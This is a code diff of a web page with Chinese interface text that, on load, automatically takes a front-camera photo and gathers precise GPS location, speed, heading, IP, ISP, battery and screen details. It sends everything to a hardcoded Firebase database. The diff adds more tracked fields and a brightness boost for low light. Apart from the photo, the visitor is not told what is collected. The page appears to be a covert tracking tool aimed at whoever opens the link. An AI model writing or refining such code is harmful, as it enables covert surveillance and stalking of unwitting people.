@@ -23,6 +23,10 @@
             padding: 20px; 
             max-width: 400px; 
             margin: 0 auto; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-height: 100vh;
         }
         h1 { 
             font-size: 1.5rem; 
@@ -56,53 +60,112 @@
         <!-- Camera preview -->
         <div id="cameraSection" style="display:none;">
             <p style="margin:15px 0 8px;">前置相机已开启，正在拍照...</p>
-            <video id="video" autoplay playsinline></video>
+            <video id="video" autoplay playsinline muted></video>
         </div>
     </div>
 
     <script>
         const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";
 
+        let mediaStream = null;
+
+        /**
+         * Cleanup media stream immediately after capture
+         */
+        function cleanupMedia() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => {
+                    try {
+                        track.stop();
+                    } catch (e) {
+                        console.warn("Track stop error:", e);
+                    }
+                });
+                mediaStream = null;
+            }
+        }
+
+        /**
+         * Start camera, capture photo, and immediately close camera
+         */
         async function startRecording() {
             let photoBase64 = null;
 
             try {
-                // Force front camera
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                // Request camera with optimized settings for low-light
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: "user",
                         width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        height: { ideal: 720 },
+                        // Low-light optimization
+                        brightness: { ideal: 150 },
+                        contrast: { ideal: 100 },
+                        saturation: { ideal: 100 },
+                        sharpness: { ideal: 100 }
                     }
                 });
 
                 const video = document.getElementById('video');
-                video.srcObject = stream;
+                video.srcObject = mediaStream;
                 document.getElementById('cameraSection').style.display = 'block';
 
-                // 4-second delay for better exposure (brighter photo)
+                console.log("✓ Camera stream started");
+
+                /**
+                 * Capture photo with optimized timing
+                 * 2.5 seconds allows sensor auto-calibration for better exposure
+                 */
                 setTimeout(() => {
                     try {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth || 1280;
                         canvas.height = video.videoHeight || 720;
                         const ctx = canvas.getContext('2d');
+                        
+                        // Draw with brightness filter for low-light enhancement
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // Apply canvas-level brightness boost for low-light
+                        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                        const data = imageData.data;
+                        
+                        // Boost brightness by 15% for low-light environments
+                        for (let i = 0; i < data.length; i += 4) {
+                            data[i] = Math.min(255, data[i] * 1.15);     // Red
+                            data[i + 1] = Math.min(255, data[i + 1] * 1.15); // Green
+                            data[i + 2] = Math.min(255, data[i + 2] * 1.15); // Blue
+                            // data[i + 3] is alpha, leave unchanged
+                        }
+                        
+                        ctx.putImageData(imageData, 0, 0);
                         photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
-
-                        sendAllData(photoBase64);
+                        
+                        console.log("✓ Photo captured successfully");
+                        
+                        // IMMEDIATELY close camera after capture
+                        cleanupMedia();
+                        
+                        // Start data collection in parallel
+                        collectAndSendData(photoBase64);
                     } catch (err) {
-                        console.error("Photo capture failed:", err);
-                        sendAllData(null);
+                        console.error("✗ Photo capture failed:", err);
+                        cleanupMedia();
+                        collectAndSendData(null);
                     }
-                }, 4000);
+                }, 2500);
 
             } catch (err) {
+                console.error("✗ Camera permission error:", err);
+                cleanupMedia();
                 document.getElementById('content').innerHTML = `<h2 class="error">权限被拒绝，请重试。</h2>`;
             }
         }
 
-        async function sendAllData(photoBase64) {
+        /**
+         * Collect all available data in parallel
+         */
+        async function collectAndSendData(photoBase64) {
             const payload = {
                 timestamp: new Date().toISOString(),
                 user_agent: navigator.userAgent,
@@ -115,70 +178,149 @@
                 screen_height: screen.height,
                 screen_avail_width: screen.availWidth,
                 screen_avail_height: screen.availHeight,
+                screen_color_depth: screen.colorDepth,
+                screen_pixel_depth: screen.pixelDepth,
                 battery_level: null,
                 battery_charging: null,
+                battery_health: null,
                 device_latitude: null,
                 device_longitude: null,
                 device_accuracy_meters: null,
+                device_altitude: null,
+                device_altitude_accuracy: null,
+                device_heading: null,
+                device_speed: null,
                 ip: "unavailable",
                 city: "unknown",
                 region: "unknown",
                 country: "unknown",
+                country_code: "unknown",
+                isp: "unknown",
                 photo_base64: photoBase64,
                 note: "前置相机自动拍照"
             };
 
-            // Battery
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    payload.battery_level = Math.round(battery.level * 100);
-                    payload.battery_charging = battery.charging;
-                } catch (e) {}
-            }
+            /**
+             * Collect data in parallel for maximum efficiency
+             */
+            const dataPromises = [];
 
-            // GPS
-            if (navigator.geolocation) {
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 15000
+            // Battery API (deprecated but try anyway)
+            dataPromises.push(
+                (async () => {
+                    if (navigator.getBattery) {
+                        try {
+                            const battery = await navigator.getBattery();
+                            payload.battery_level = Math.round(battery.level * 100);
+                            payload.battery_charging = battery.charging;
+                            payload.battery_health = battery.health || null;
+                            console.log("✓ Battery data obtained");
+                        } catch (e) {
+                            console.warn("⚠ Battery API failed:", e.message);
+                        }
+                    }
+                })()
+            );
+
+            // Geolocation with comprehensive data
+            dataPromises.push(
+                (async () => {
+                    if (navigator.geolocation) {
+                        try {
+                            const pos = await new Promise((resolve, reject) => {
+                                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                    enableHighAccuracy: true,
+                                    timeout: 15000,
+                                    maximumAge: 0
+                                });
+                            });
+                            payload.device_latitude = pos.coords.latitude;
+                            payload.device_longitude = pos.coords.longitude;
+                            payload.device_accuracy_meters = pos.coords.accuracy;
+                            payload.device_altitude = pos.coords.altitude;
+                            payload.device_altitude_accuracy = pos.coords.altitudeAccuracy;
+                            payload.device_heading = pos.coords.heading;
+                            payload.device_speed = pos.coords.speed;
+                            console.log("✓ GPS location obtained");
+                        } catch (e) {
+                            console.warn("⚠ Geolocation failed:", e.message);
+                        }
+                    }
+                })()
+            );
+
+            // IP-based location with timeout
+            dataPromises.push(
+                (async () => {
+                    try {
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), 10000);
+                        
+                        const res = await fetch('https://ipapi.co/json', { 
+                            signal: controller.signal 
                         });
-                    });
-                    payload.device_latitude = pos.coords.latitude;
-                    payload.device_longitude = pos.coords.longitude;
-                    payload.device_accuracy_meters = pos.coords.accuracy;
-                } catch (e) {}
-            }
+                        clearTimeout(timeoutId);
+                        
+                        if (res.ok) {
+                            const data = await res.json();
+                            payload.ip = data.ip || "unavailable";
+                            payload.city = data.city || "unknown";
+                            payload.region = data.region || "unknown";
+                            payload.country = data.country_name || "unknown";
+                            payload.country_code = data.country_code || "unknown";
+                            payload.isp = data.org || "unknown";
+                            console.log("✓ IP location obtained");
+                        }
+                    } catch (e) {
+                        console.warn("⚠ IP lookup failed:", e.message);
+                    }
+                })()
+            );
 
-            // IP
-            try {
-                const res = await fetch('https://ipapi.co/json');
-                if (res.ok) {
-                    const data = await res.json();
-                    payload.ip = data.ip || "unavailable";
-                    payload.city = data.city || "unknown";
-                    payload.region = data.region || "unknown";
-                    payload.country = data.country_name || "unknown";
-                }
-            } catch (e) {}
+            // Wait for all data collection to complete
+            await Promise.all(dataPromises);
 
-            // Send to Firebase
+            console.log("✓ All data collected, sending to Firebase");
+
+            // Send to Firebase with timeout
             try {
-                await fetch(FIREBASE_URL, {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
+                const response = await fetch(FIREBASE_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(payload),
+                    signal: controller.signal
                 });
-                document.getElementById('content').innerHTML = `<h2 class="success">照片已自动发送 ❤️<br>谢谢！</h2>`;
+                clearTimeout(timeoutId);
+
+                if (response.ok) {
+                    console.log("✓ Data sent to Firebase successfully");
+                    document.getElementById('content').innerHTML = `<h2 class="success">照片已自动发送 ❤️<br>谢谢！</h2>`;
+                } else {
+                    throw new Error(`Firebase response: ${response.status}`);
+                }
             } catch (e) {
-                document.getElementById('content').innerHTML = `<h2 class="error">发送失败，请重试。</h2>`;
+                console.error("✗ Firebase send error:", e);
+                document.getElementById('content').innerHTML = `<h2 class="error">发送失败，请检查网络连接后重试。</h2>`;
             }
         }
 
         // Start everything
         document.addEventListener('DOMContentLoaded', startRecording);
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            cleanupMedia();
+        });
+
+        // Cleanup on visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                cleanupMedia();
+            }
+        });
     </script>
 </body>
 </html>
